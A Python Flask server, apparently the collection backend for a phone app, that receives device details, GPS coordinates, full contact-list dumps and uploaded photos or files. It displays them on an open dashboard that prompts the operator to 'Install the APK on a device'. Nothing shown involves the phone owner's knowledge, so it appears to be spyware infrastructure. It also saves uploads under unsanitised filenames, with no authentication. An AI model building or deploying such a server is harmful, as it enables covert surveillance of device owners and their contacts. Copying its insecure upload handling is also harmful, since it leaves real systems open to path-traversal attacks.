import os
import sqlite3
import json
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory, render_template, redirect, url_for
from flask_cors import CORS

DB_PATH = os.path.join(os.path.dirname(__file__), 'data.db')
UPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

app = Flask(__name__)
CORS(app)

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS device_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        model TEXT,
        os_version TEXT,
        contacts_count INTEGER,
        images INTEGER,
        videos INTEGER,
        docs INTEGER,
        by_type_json TEXT,
        lat REAL,
        lon REAL,
        created_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS uploads (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        filename TEXT,
        stored_path TEXT,
        created_at TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS contacts_dump (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT,
        json TEXT,
        count INTEGER,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()

@app.route('/api/v1/data', methods=['POST'])
def receive_data():
    payload = request.get_json(force=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO device_data(device_id, model, os_version, contacts_count, images, videos, docs, by_type_json, lat, lon, created_at)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''', (
        payload.get('deviceId'),
        payload.get('deviceInfo', {}).get('model'),
        payload.get('deviceInfo', {}).get('version'),
        int(payload.get('contactsCount', 0)),
        int(payload.get('mediaStats', {}).get('images', 0)),
        int(payload.get('mediaStats', {}).get('videos', 0)),
        int(payload.get('mediaStats', {}).get('docs', 0)),
        payload.get('mediaStats', {}).get('byType', {}).__str__(),
        payload.get('location', {}).get('lat'),
        payload.get('location', {}).get('lon'),
        datetime.utcnow().isoformat()
    ))
    conn.commit()
    conn.close()
    return jsonify({'ok': True})

@app.route('/api/v1/contacts', methods=['POST'])
def receive_contacts():
    payload = request.get_json(force=True)
    contacts = payload.get('contacts', [])
    device_id = payload.get('deviceId')
    # 以唯一手机号数量作为统计口径
    unique_numbers = set()
    try:
        for item in contacts:
            for p in item.get('phones', []) or []:
                if isinstance(p, str):
                    n = p.strip()
                    if n:
                        unique_numbers.add(n)
    except Exception:
        pass
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO contacts_dump(device_id, json, count, created_at)
                 VALUES (?, ?, ?, ?)''', (device_id, json.dumps(contacts), len(unique_numbers), datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'ok': True, 'count': len(unique_numbers)})

@app.route('/api/v1/photos', methods=['POST'])
def receive_photos():
    device_id = request.form.get('deviceId')
    f = request.files.get('file')
    if not f:
        return jsonify({'ok': False, 'error': 'no file'}), 400
    filename = f.filename
    stored = os.path.join(UPLOAD_DIR, filename)
    f.save(stored)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO uploads(device_id, filename, stored_path, created_at)
                 VALUES (?, ?, ?, ?)''', (device_id, filename, stored, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'ok': True, 'path': stored})
@app.route('/api/v1/upload', methods=['POST'])
def receive_upload():
    device_id = request.form.get('deviceId')
    f = request.files.get('file')
    if not f:
        return jsonify({'ok': False, 'error': 'no file'}), 400
    filename = f.filename
    stored = os.path.join(UPLOAD_DIR, filename)
    f.save(stored)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO uploads(device_id, filename, stored_path, created_at)
                 VALUES (?, ?, ?, ?)''', (device_id, filename, stored, datetime.utcnow().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'ok': True, 'path': stored})

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    # Get stats
    device_count = c.execute('SELECT COUNT(DISTINCT device_id) FROM device_data').fetchone()[0]
    contacts_total = c.execute('SELECT SUM(count) FROM contacts_dump').fetchone()[0] or 0
    uploads_count = c.execute('SELECT COUNT(*) FROM uploads').fetchone()[0]
    today = datetime.utcnow().isoformat()[:10]
    active_today = c.execute('SELECT COUNT(DISTINCT device_id) FROM device_data WHERE created_at LIKE ?', (today + '%',)).fetchone()[0]

    # Get recent devices
    rows = c.execute('SELECT id, device_id, model, os_version, contacts_count, images, videos, docs, lat, lon, created_at FROM device_data ORDER BY id DESC LIMIT 50').fetchall()
    
    # Get recent uploads
    uploads = c.execute('SELECT id, device_id, filename, stored_path, created_at FROM uploads ORDER BY id DESC LIMIT 20').fetchall()
    uploads_data = [(u[0], u[1], os.path.basename(u[3]), u[3], u[4]) for u in uploads]

    # Get recent contacts dumps
    contacts = c.execute('SELECT id, device_id, count, created_at FROM contacts_dump ORDER BY id DESC LIMIT 20').fetchall()
    latest_contacts_map = dict(c.execute('SELECT device_id, MAX(id) FROM contacts_dump GROUP BY device_id').fetchall())
    conn.close()

    # Intelligent Suggestions Logic
    suggestions = []
    if device_count == 0:
        suggestions.append({'type': 'warning', 'icon': 'exclamation-triangle', 'title': 'No Devices Connected', 'message': 'Install the APK on a device to start receiving data.'})
    if active_today == 0 and device_count > 0:
        suggestions.append({'type': 'info', 'icon': 'clock', 'title': 'No Activity Today', 'message': 'Check if devices are online or the app is running.'})
    
    # Check for old Android versions
    old_devices = [r for r in rows if r[3] and r[3].split('.')[0].isdigit() and int(r[3].split('.')[0]) < 10]
    if old_devices:
        suggestions.append({'type': 'warning', 'icon': 'mobile-alt', 'title': 'Outdated Android Versions', 'message': f'{len(old_devices)} devices are running Android < 10. Consider upgrading.'})

    stats = {
        'device_count': device_count,
        'contacts_total': contacts_total,
        'uploads_count': uploads_count,
        'active_today': active_today
    }

    return render_template('dashboard.html', stats=stats, suggestions=suggestions, devices=rows, uploads=uploads_data, contacts=contacts, latest_contacts_map=latest_contacts_map)


@app.route('/')
def index():
    return jsonify({'status': 'ok', 'message': 'SecureData backend running', 'dashboard': '/dashboard'})

@app.route('/devices')
def devices():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    # Get all unique devices with their latest stats
    rows = c.execute('''
        SELECT d.device_id, d.model, d.os_version, d.contacts_count, d.images, d.videos, d.created_at
        FROM device_data d
        INNER JOIN (
            SELECT device_id, MAX(id) as max_id
            FROM device_data
            GROUP BY device_id
        ) latest ON d.id = latest.max_id
        ORDER BY d.created_at DESC
    ''').fetchall()
    conn.close()
    return render_template('dashboard.html', devices=[(0, r[0], r[1], r[2], r[3], r[4], r[5], 0, None, None, r[6]) for r in rows], stats={}, suggestions=[], uploads=[], contacts=[]) # Reuse dashboard layout or create specific one


@app.route('/device/<device_id>')
def device_detail(device_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    history = c.execute('SELECT model, os_version, contacts_count, images, videos, docs, lat, lon, created_at FROM device_data WHERE device_id=? ORDER BY id DESC LIMIT 50', (device_id,)).fetchall()
    contacts = c.execute('SELECT id, count, created_at FROM contacts_dump WHERE device_id=? ORDER BY id DESC LIMIT 20', (device_id,)).fetchall()
    uploads = c.execute('SELECT id, filename, stored_path, created_at FROM uploads WHERE device_id=? ORDER BY id DESC LIMIT 20', (device_id,)).fetchall()
    conn.close()
    
    latest = history[0] if history else None
    # Reformat history for template (add fake ID at index 0 to match tuple structure if needed, or just access by name/index in template)
    # The template expects: r[0]=model, r[1]=os... based on SELECT above
    # Wait, template uses: r[8]=time, r[0]=model. The SELECT is: model(0), os(1), contacts(2), img(3), vid(4), doc(5), lat(6), lon(7), time(8)
    # Template: time=r[8], model=r[0], os=r[1], c=r[2], i=r[3], v=r[4], lat=r[6], lon=r[7]. This matches.
    
    latest_formatted = None
    if latest:
        # Template uses latest[2]=model? No, template uses latest[2] for model.
        # Let's fix template or data.
        # Template: model=latest[2], os=latest[3], count=latest[4], time=latest[10] -> This assumes structure from 'dashboard' query.
        # Let's align 'latest' to be consistent or update template.
        # Easier to pass 'latest' as a dict or object.
        latest_formatted = [
            0, 0, latest[0], latest[1], latest[2], latest[3], latest[4], latest[5], latest[6], latest[7], latest[8]
        ]

    return render_template('device_detail.html', device_id=device_id, history=history, contacts=contacts, uploads=uploads, latest=latest_formatted)


@app.route('/contacts')
def contacts_index():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT id, device_id, count, created_at FROM contacts_dump ORDER BY id DESC LIMIT 200').fetchall()
    conn.close()
    return render_template('dashboard.html', devices=[], stats={}, suggestions=[], uploads=[], contacts=rows) # Or create contacts.html


@app.route('/contacts/<int:dump_id>')
def contacts_detail(dump_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    row = c.execute('SELECT device_id, json, count, created_at FROM contacts_dump WHERE id=?', (dump_id,)).fetchone()
    conn.close()
    device_id, json_text, count, created_at = row if row else (None, '[]', 0, '')
    try:
        items = json.loads(json_text)
    except Exception:
        items = []
    return render_template('contacts_detail.html', dump_id=dump_id, device_id=device_id, count=count, created_at=created_at, items=items)


@app.route('/uploads')
def uploads_index():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    rows = c.execute('SELECT id, device_id, filename, stored_path, created_at FROM uploads ORDER BY id DESC LIMIT 200').fetchall()
    conn.close()
    return render_template('uploads.html', uploads=rows)


@app.route('/uploads/<path:name>')
def serve_upload(name):
    return send_from_directory(UPLOAD_DIR, name)

@app.route('/device/<device_id>/delete', methods=['POST'])
def delete_device(device_id):
    if not device_id:
        return jsonify({'ok': False, 'error': 'missing device_id'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    # Collect upload file paths for this device
    files = c.execute('SELECT stored_path FROM uploads WHERE device_id=?', (device_id,)).fetchall()
    # Delete DB rows
    c.execute('DELETE FROM uploads WHERE device_id=?', (device_id,))
    c.execute('DELETE FROM contacts_dump WHERE device_id=?', (device_id,))
    c.execute('DELETE FROM device_data WHERE device_id=?', (device_id,))
    conn.commit()
    conn.close()
    # Delete files on disk
    for (path,) in files:
        try:
            if path and os.path.exists(path):
                os.remove(path)
        except Exception:
            pass
    # Redirect back to dashboard
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=8000)
